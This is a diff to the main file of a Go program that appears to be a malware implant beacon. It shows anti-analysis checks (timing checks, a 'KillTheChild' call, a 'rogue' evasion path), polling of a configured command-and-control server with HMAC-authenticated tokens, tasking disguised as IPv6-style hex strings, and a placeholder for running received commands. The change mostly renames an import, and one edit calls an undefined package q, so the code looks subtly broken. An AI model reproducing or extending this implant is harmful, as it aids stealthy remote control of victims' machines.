@@ -1,9 +1,9 @@
 package main
 
 import (
-	"0xo0xo0xo0xo0/z/anti"
-	"0xo0xo0xo0xo0/z/rogue"
-	"0xo0xo0xo0xo0/z/shared"
+	"NULL/0x27894365/base_config/anti"
+	"NULL/0x27894365/base_config/rogue"
+	shared2 "NULL/0x27894365/base_config/shared"
 	"crypto/sha256"
 	"encoding/base64"
 	"encoding/json"
@@ -79,11 +79,11 @@ func main() {
 	*/
 
 	seed := "supersecretseedvalue"
-	secureFunc := shared.NewSecureFunction(seed)
+	secureFunc := shared2.NewSecureFunction(seed)
 	initCouner := secureFunc.DeriveCount()
 
-	anti.TimingCheck()
-	anti.KillTheChild()
+	q.TimingCheck()
+	q.KillTheChild()
 	switch BB23598623() {
 	case true:
 		rogue.Func549687354()
@@ -92,7 +92,7 @@ func main() {
 	case false:
 		if BB176245(42) {
 			// Load configuration from embedded data
-			conf, err := shared.LoadConfig()
+			conf, err := shared2.LoadConfig()
 			if err != nil {
 				// log.Fatalf("Failed to load config: %v", err)
 				break
@@ -107,7 +107,7 @@ func main() {
 				postUrl := ""
 				postUrl = conf.Method + "://" + conf.Host + ":" + conf.Port + conf.PostPath
 
-				callKey := shared.ProtectedCaller(seed, initCouner)
+				callKey := shared2.ProtectedCaller(seed, initCouner)
 
 				token, timestamp := secureFunc.GenerateAuthToken(CompUUID, conf.Psk2, callKey)
 
@@ -122,7 +122,7 @@ func main() {
 				// if enabled at compile time, DoComp returns the compressed object and bool true
 				// if disabled (default) the function returns false
 				// if false, the params are instead appended to the request uncompressed
-				compedData, shouldComp := shared.DoComp(hardVals)
+				compedData, shouldComp := shared2.DoComp(hardVals)
 				// anti.TimingCheck()
 				if shouldComp {
 					//fmt.Println(hardVals)
@@ -132,7 +132,7 @@ func main() {
 					// makeGetRequest 3 times with a 10 second delay between each attempt
 					// if the request is successful, break the loop
 					// otherwise, the 3 timeouts cause the program to exit
-					resp, err := shared.GetDataRequest(baseUrl, maxRetries, tokenCookie)
+					resp, err := shared2.GetDataRequest(baseUrl, maxRetries, tokenCookie)
 					if err != nil {
 						return
 					}
@@ -171,7 +171,7 @@ func main() {
 
 					// The response comes encoded in a hex format that mimics IPv6 IPs
 					// Decode that data
-					decoded, err := shared.DecodeIPv6ToString(data.Message)
+					decoded, err := shared2.DecodeIPv6ToString(data.Message)
 					if err != nil {
 						fmt.Println(err)
 						break
@@ -180,7 +180,7 @@ func main() {
 
 					// Verify the message with the received HMAC
 					initCouner = secureFunc.DeriveCount()
-					callKey := shared.ProtectedCaller(seed, initCouner)
+					callKey := shared2.ProtectedCaller(seed, initCouner)
 					if secureFunc.VerifyMessageWithHMAC(data.Message, data.Key, callKey, []byte(conf.Psk1)) {
 						fmt.Println("HMAC is valid!")
 						// Here is where command processing should occur
@@ -189,7 +189,7 @@ func main() {
 						// Returns the result of execution (stdout or bool) or returns an error
 
 						impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
-						err = shared.SendDataRequest(postUrl, "test success", maxRetries, impIdCookie)
+						err = shared2.SendDataRequest(postUrl, "test success", maxRetries, impIdCookie)
 						if err != nil {
 							return
 						}
@@ -212,7 +212,7 @@ func main() {
 					// if the request is successful, break the loop
 					// otherwise, the 3 timeouts cause the program to exit
 					fmt.Println(baseUrl)
-					resp, err := shared.GetDataRequest(baseUrl, maxRetries, tokenCookie, timestampCookie, impIdCookie)
+					resp, err := shared2.GetDataRequest(baseUrl, maxRetries, tokenCookie, timestampCookie, impIdCookie)
 					if err != nil {
 						//fmt.Println("Final error:", err)
 						return
@@ -253,7 +253,7 @@ func main() {
 
 					// The response comes encoded in a hex format that mimics IPv6 IPs
 					// Decode that data
-					_, err = shared.DecodeIPv6ToString(data.Message)
+					_, err = shared2.DecodeIPv6ToString(data.Message)
 					if err != nil {
 						//fmt.Println(err)
 						break
@@ -263,7 +263,7 @@ func main() {
 					// Verify the message with the received HMAC
 					// First get the counter through the DeriveCount func
 					initCouner = secureFunc.DeriveCount()
-					callKey := shared.ProtectedCaller(seed, initCouner)
+					callKey := shared2.ProtectedCaller(seed, initCouner)
 					switch secureFunc.VerifyMessageWithHMAC(data.Message, data.Key, callKey, []byte(conf.Psk1)) {
 					case true:
 						fmt.Println("HMAC is valid!")
@@ -273,7 +273,7 @@ func main() {
 						// Returns the result of execution (stdout or bool) or returns an error
 
 						impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
-						err = shared.SendDataRequest(postUrl, "test success", maxRetries, impIdCookie)
+						err = shared2.SendDataRequest(postUrl, "test success", maxRetries, impIdCookie)
 						if err != nil {
 							fmt.Println(err)
 						}
